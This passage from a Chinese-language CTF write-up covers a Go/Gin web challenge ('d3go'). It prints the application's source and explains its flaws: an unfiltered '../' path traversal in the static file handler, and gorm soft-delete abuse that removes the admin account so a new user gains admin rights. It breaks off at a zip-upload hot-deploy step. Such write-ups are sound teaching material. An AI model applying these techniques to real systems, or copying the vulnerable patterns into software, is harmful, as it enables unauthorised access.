class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微审一下题，首先在main.go有这么一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段对静态文件做了些处理，他直接就没对../进行处理，导致我们可以任意目录穿越，也就是一开始我们任意文件读取，读取完后再注意一下controller里的这一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对应的user.go如上，是一个struct，但是里面有一个字段需要注意</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>给了 gorm.model 就说明自带deletedat字段，也就是有软删除这么一说，软删除也就是非实际删除数据库数据，而是单纯无法查询出来。结合一下上面的源码，我们的目的是以admin登录然后去上传zip文件，因此我们应该软链接先删除一下admin：</p><p>这里的话admin是数据库中的第一个用户</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>然后再创建一个用户</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>之后登录test就是管理员了，因为代码里的逻辑是ID为1的用户就是管理员，那么接下来就好说了，由题目中config.go和main.go可以得知实现了热部署</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 